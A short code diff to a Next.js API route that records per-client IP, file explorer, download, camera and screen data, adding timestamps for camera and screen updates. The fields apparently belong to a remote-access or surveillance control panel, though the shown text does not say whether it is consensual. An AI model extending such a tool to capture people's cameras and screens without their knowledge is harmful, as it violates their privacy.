@@ -19,8 +19,10 @@ export async function POST(req: Request) {
         explorerData: null, 
         downloadData: null, 
         cameraData: null, 
+        cameraUpdatedAt: 0,
         isCameraActive: false,
         screenData: null,
+        screenUpdatedAt: 0,
         isScreenActive: false
       };
       clients.set(id, client);
@@ -31,8 +33,14 @@ export async function POST(req: Request) {
     client.ip = ip;
     client.messages = [];
 
-    if (body.screen) client.screenData = body.screen;
-    if (body.camera) client.cameraData = body.camera;
+    if (body.screen) {
+      client.screenData = body.screen;
+      client.screenUpdatedAt = Date.now();
+    }
+    if (body.camera) {
+      client.cameraData = body.camera;
+      client.cameraUpdatedAt = Date.now();
+    }
     
     return NextResponse.json({ 
       status: "ok", 
